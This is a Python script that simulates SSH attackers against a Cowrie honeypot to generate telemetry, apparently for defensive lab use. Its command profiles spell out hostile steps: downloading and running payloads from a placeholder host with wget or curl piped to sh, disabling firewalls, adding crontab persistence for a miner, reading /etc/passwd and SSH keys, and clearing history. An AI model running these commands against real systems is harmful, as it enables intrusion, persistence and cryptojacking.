#!/usr/bin/env python3
"""
Simulate realistic SSH attack behavior against a Cowrie honeypot (T-Pot).
Supports multiple attacker profiles for diverse telemetry generation.
"""

import paramiko
import time
import sys
import yaml
import argparse
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
CONFIG_PATH = REPO_ROOT / "config.yml"

# Script-specific defaults (not pulled from config)
DEFAULT_USERNAME = "admin"
DEFAULT_PORT = 22

# Fake, harmless malware URLs (will not resolve or execute)
MALWARE_URLS = [
    "http://malware.example.fake/bot.sh",
    "http://malware.example.fake/xmrig.sh",
    "http://malware.example.fake/mips",
]

def get_commands_for_profile(profile):
    """Return list of shell commands based on attacker profile."""
    base_commands = [
        "uname -a",
        "id",
        "pwd",
        "cat /etc/issue",
        "df -h",
    ]

    if profile == "basic":
        return base_commands + [
            "ps aux",
            "netstat -tuln",
            "ls -la /tmp/",
            "cat /etc/passwd | grep -v nologin",
            f"wget {MALWARE_URLS[0]} -O /tmp/.updater || true",
            "chmod +x /tmp/.updater || true",
            "/tmp/.updater &",
            "rm -f /tmp/.updater || true",
        ]

    elif profile == "miner":
        return base_commands + [
            "systemctl stop ufw firewalld 2>/dev/null",
            "pkill -f xmrig 2>/dev/null",
            f"curl -s {MALWARE_URLS[1]} | sh || wget {MALWARE_URLS[1]} -O /tmp/x.sh && sh /tmp/x.sh",
            "echo '@reboot curl -s http://malware.example.fake/xmrig.sh | sh' | crontab -",
            "rm -f /tmp/x.sh 2>/dev/null",
        ]

    elif profile == "recon":
        return base_commands + [
            "ip a",
            "cat /etc/os-release",
            "hostname",
            "arp -a",
            "cat ~/.ssh/authorized_keys 2>/dev/null",
            "find /home -type f -name '*.ssh' 2>/dev/null",
            "systemctl list-units --type=service --state=running",
            "ss -tuln",  # modern netstat alternative
        ]

    elif profile == "iot":
        return [
            "uname -m",  # architecture check
            "cat /proc/cpuinfo | grep -i hardware",
            "cat /proc/version",
            f"wget {MALWARE_URLS[2]} -O /tmp/.m || true",
            "chmod +x /tmp/.m || true",
            "/tmp/.m &",
            "rm -f /tmp/.m || true",
        ]

    # fallback
    return base_commands + ["echo 'Unknown profile, running basic recon...'"]

def load_ip_from_config():
    """Load target IP from config.yml if available."""
    if not CONFIG_PATH.exists():
        return None
    try:
        with open(CONFIG_PATH, "r") as f:
            cfg = yaml.safe_load(f) or {}
    except Exception:
        return None

    targets = cfg.get("targets")
    if isinstance(targets, list) and len(targets) > 0:
        first = targets[0]
        if isinstance(first, dict):
            return first.get("ip") or first.get("host") or first.get("address")
        else:
            return str(first)
    return cfg.get("target") or cfg.get("host")

def run_ssh_commands(client, profile="basic"):
    """Send post-compromise commands to the emulated shell."""
    shell = client.invoke_shell()
    time.sleep(1)

    commands = get_commands_for_profile(profile)
    commands += ["history -c", "exit"]

    for cmd in commands:
        shell.send(cmd + "\n")
        # Add slight timing variance to mimic human behavior
        time.sleep(1.0 + 0.5 * (hash(cmd) % 10) / 10)

    # Optional: capture and print debug output (safe for Cowrie)
    output = ""
    while shell.recv_ready():
        chunk = shell.recv(1024)
        if not chunk:
            break
        output += chunk.decode('utf-8', errors='ignore')
    if output.strip():
        print("[+] Emulated shell output (truncated to 500 chars):")
        print(output[:500] + ("..." if len(output) > 500 else ""))

def simulate_attack(config, profile="basic"):
    """Perform two login attempts (first fails, second 'succeeds') and run commands."""
    # First attempt: expected to fail (triggers Cowrie logic)
    try:
        client1 = paramiko.SSHClient()
        client1.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client1.connect(
            config["ip"],
            port=config["port"],
            username=config["username"],
            password="password123",
            timeout=10
        )
        client1.close()
    except Exception as e:
        print(f"[*] First login failed as expected: {e}")

    time.sleep(2)

    # Second attempt: Cowrie grants shell
    try:
        client2 = paramiko.SSHClient()
        client2.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client2.connect(
            config["ip"],
            port=config["port"],
            username=config["username"],
            password="letmein",
            timeout=10
        )
        print(f"[+] Second login 'successful' – running '{profile}' post-exploit commands...")
        run_ssh_commands(client2, profile)
        client2.close()
    except Exception as e:
        print(f"[!] Second login failed: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(
        description="Simulate SSH attack against Cowrie honeypot with configurable behavior."
    )
    parser.add_argument(
        "target",
        nargs="?",
        help="Target IP address. If omitted, uses first entry in config.yml."
    )
    parser.add_argument(
        "-u", "--user",
        default=DEFAULT_USERNAME,
        help=f"SSH username (default: {DEFAULT_USERNAME})"
    )
    parser.add_argument(
        "-p", "--port",
        type=int,
        default=DEFAULT_PORT,
        help=f"SSH port (default: {DEFAULT_PORT})"
    )
    parser.add_argument(
        "--profile",
        choices=["basic", "miner", "recon", "iot"],
        default="basic",
        help="Attacker behavior profile (default: basic)"
    )

    args = parser.parse_args()

    # Determine target IP
    ip = args.target.strip() if args.target else load_ip_from_config()
    ip = ip or "127.0.0.1"

    config = {
        "ip": ip,
        "port": args.port,
        "username": args.user
    }

    print("[*] Simulating SSH attack against Cowrie honeypot...")
    print(f"[*] Target: {config['ip']}:{config['port']} | User: {config['username']} | Profile: {args.profile}")

    simulate_attack(config, args.profile)
    print("[*] Attack simulation complete.")

if __name__ == "__main__":
    main()  